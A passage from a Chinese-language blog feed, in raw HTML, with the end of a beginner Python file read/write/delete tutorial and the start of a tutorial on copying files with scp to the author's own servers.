<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们需要两行的时候：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果我们需要三行：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Good luck!
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个用法它会逐行读取，并且打印输出的时候是会换行的</p>
<p>在读配置文件的时候也许会用到吧&hellip;</p>
<p>当然我们也可以用 <code>for</code> 循环读一次性读全部：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Good luck!
</span></span></code></pre></td></tr></table>
</div>
</div><p>我觉得用 <code>for</code> 应该更有效率点&hellip;</p>
<h3 id="关闭文件">关闭文件</h3>
<p>这个没什么好讲的&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行了也是跟上面差不多的效果</p>
<blockquote>
<p>下面不给出调试结果了，太晚了。</p>
</blockquote>
<h3 id="创建">创建</h3>
<p><strong>&ldquo;x&rdquo;</strong> 表示创建一个新文件，如果文件名指的那个文件已经存在就会报错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;x&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>自己去试试啦，这个没什么好说的。</p>
<h3 id="写">写</h3>
<p><strong>&ldquo;a&rdquo;</strong> 表示在已有文件上添加内容，它不会使文件原有的内容被删除或者被覆盖</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;加入内容 / content added.&#34;</span><span class="p">)</span> <span class="c1"># 这段字符串将会被添加到这个文件里</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>&ldquo;w&rdquo;</strong> 表示将会覆盖那个文件，它将会覆盖原有的内容</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;加入内容 / content added.&#34;</span><span class="p">)</span> <span class="c1"># 文件将只会存在这段字符串</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="删">删</h3>
<p>这里需要用到 <code>os</code> 这个模块，并用到里面的 <code>os.remove()</code> 函数，直接 <code>import os</code> 即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="典型例子">典型例子</h4>
<p>检测一个文件是否存在，如果存在就删除，不存在就提示</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;文件不存在&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="删除目录">删除目录</h4>
<p>用 <code>os.rmdir()</code> 即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">rmdir</span><span class="p">(</span><span class="s2">&#34;foldername&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="总结">总结</h2>
<p>这些就是基础的文件读写操作需要知道的东西啦&hellip;</p>
<p>如果看完没什么概念的话，可以试试下面这一大串代码</p>
<p>可以改改里面 <code>open()</code> 的 mode 参数试试</p>
<p>总结代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">datetime</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sign</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 程序标识</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">╭╮╭╮╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╭╮
</span></span></span><span class="line"><span class="cl"><span class="s1">┃┃┃┃┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╮╭╮┃╱╱╱╱╱╱╱╱┃┃
</span></span></span><span class="line"><span class="cl"><span class="s1">┃┃┃┃┃┣━━┳━━┳━━┳┳━╮╭━━╮┃┃┃┣━━┳━━┳━━┫┃
</span></span></span><span class="line"><span class="cl"><span class="s1">┃╰╯╰╯┃┃━┫┃━┫╭╮┣┫╭╮┫╭╮┃┃┃┃┃╭╮┃╭╮┃┃━┫┃
</span></span></span><span class="line"><span class="cl"><span class="s1">╰╮╭╮╭┫┃━┫┃━┫╰╯┃┃┃┃┃╰╯┣╯╰╯┃╰╯┃╰╯┃┃━┫╰╮
</span></span></span><span class="line"><span class="cl"><span class="s1">╱╰╯╰╯╰━━┻━━┫╭━┻┻╯╰┻━╮┣━━━┻━━┻━╮┣━━┻━╯
</span></span></span><span class="line"><span class="cl"><span class="s1">╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╭━╯┃
</span></span></span><span class="line"><span class="cl"><span class="s1">╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╰━━╯╱╱╱╱╱╱╰━━╯
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filecrt</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 文件创建</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span> <span class="c1">#检查文件是否存在</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span><span class="o">+</span> <span class="s2">&#34;: 文件已存在&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: 已创建文件: &#34;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filewrt</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">fruits</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;apple&#39;</span><span class="p">,</span> <span class="s1">&#39;banana&#39;</span><span class="p">,</span> <span class="s1">&#39;strawbarry&#39;</span><span class="p">,</span><span class="s1">&#39;orange&#39;</span><span class="p">]</span> <span class="c1"># 给出要写的内容</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 文件写入操作</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">fruit</span> <span class="ow">in</span> <span class="n">fruits</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">fruit</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: 已写入&#34;</span> <span class="o">+</span> <span class="n">fruit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filedel</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 删除文件操作</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: 已删除&#34;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34;不存在&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fileread</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: 读取中..&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;文件内容&#34;</span> <span class="o">+</span> <span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;文件内容&#34;</span> <span class="o">+</span> <span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sign</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">filecrt</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileread</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">filedel</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">filewrt</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileread</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">filedel</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>scp 命令小结</title>
    <link>http://weepingdogel.github.io/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/</link>
    <pubDate>Sat, 05 Sep 2020 12:10:07 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/</guid>
    <description><![CDATA[<h2 id="scp-命令是什么">scp 命令是什么</h2>
<p>是传文件用的..</p>
<p>我们用 <code>ssh</code> 操作服务器，当我们需要给服务器传输文件的时候，<code>scp</code> 命令会通过 <code>ssh</code> 的端口进行文件传输。</p>
<h2 id="用法">用法</h2>
<p>当我们在终端输入 <code>scp</code> 后，我们会得到这些</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; scp
</span></span><span class="line"><span class="cl">usage: scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
</span></span><span class="line"><span class="cl">            [-J destination] [-l limit] [-o ssh_option] [-P port]
</span></span><span class="line"><span class="cl">            [-S program] source ... target
</span></span></code></pre></td></tr></table>
</div>
</div><p>很显然我们很快就知道了一些参数&hellip;</p>
<h2 id="示例">示例</h2>
<p>这里举一些例子，来展示清楚具体的使用方法&hellip;</p>
<p>先说明一下我的测试环境</p>
<blockquote>
<p>Arch Linux</p>
<p>IP: 192.168.0.105</p>
<p>CentOS8 虚拟机</p>
<p>IP: 192.168.0.108</p>
</blockquote>
<h3 id="上传一个文件">上传一个文件</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ scp [本地文件名] 用户名@地址:[文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>这是一般用法，但是<strong>请确保路径正确！</strong></p>
<p>即：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~ [1]&gt; scp ./编译/7.1.0.zip root@192.168.0.108:/root/
</span></span><span class="line"><span class="cl">root@192.168.0.108&#39;s password: 
</span></span><span class="line"><span class="cl">7.1.0.zip                                                    100%   95KB   5.2MB/s   00:00 
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个很简单的，没什么多说的了..</p>
<h3 id="下载一个文件">下载一个文件</h3>
<p>如果我们要从服务器里取一个文件下来修改，而服务器没有 <code>ftp</code> 时该怎么办呢？</p>
<p>我们需要用 SSH 去找到这个文件的位置，不过这个就不详写了，与主题无关。（总之你知道文件的位置就可以了）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ scp 用户名@地址:[文件名] [本地文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>还是要提醒一下，这个<strong>文件名</strong>， <strong>是一个路径！</strong></p>
<p>是一个<strong>相对路径</strong>或<strong>绝对路径</strong>！具体依情况而定，但<strong>它一定是个路径！</strong></p>
<p>如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; scp root@192.168.0.108:/root/index.html /tmp/index.html
</span></span><span class="line"><span class="cl">root@192.168.0.108&#39;s password: 
</span></span><span class="line"><span class="cl">index.html                                                   100%   46KB 728.6KB/s   00:00
</span></span><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; ls /tmp/*.html -lh
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 weepingdogel weepingdogel 47K  9月  5 20:54 /tmp/index.html
</span></span></code></pre></td></tr></table>
</div>
</div><p>只需要知道文件在服务器的具体位置以及想好保存到本地的一个位置就可以了</p>
<h3 id="指定一个-ip">指定一个 IP</h3>
<p>一般情况下 SSH 的端口都是 22，那是真的云服务器或者一些有公网 IP 的服务器。</p>
<p>而上文写的是基于局域网中的文件传输，我们需要内网穿透才能远程文件传输，但内网穿透在一般情况下都是指定一个别的端口来给 SSH 建立一个通道，因此端口就不再是 22 了。</p>
<p>我这里用的是 <a href="https://www.natfrp.com/" target="_blank" rel="noopener noreffer">SakuraFRP</a> ，非常好用的免费内网穿透服务！</p>
<p><strong>上传：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">scp -P [端口]  [本地文件名] 用户名@地址:[文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>下载：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">scp -P [端口] 用户名@地址:[文件名] [本地文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>上面已经提示过很多次<strong>这个<code>[文件名]</code>是个路径了</strong>。这里就不再多废话啦。</p>
<p>嗯&hellip; 具体就是这样子的：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py
</span></span></code></pre></td></tr></table>
</div>
</div><p>但是这里我来个组合命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
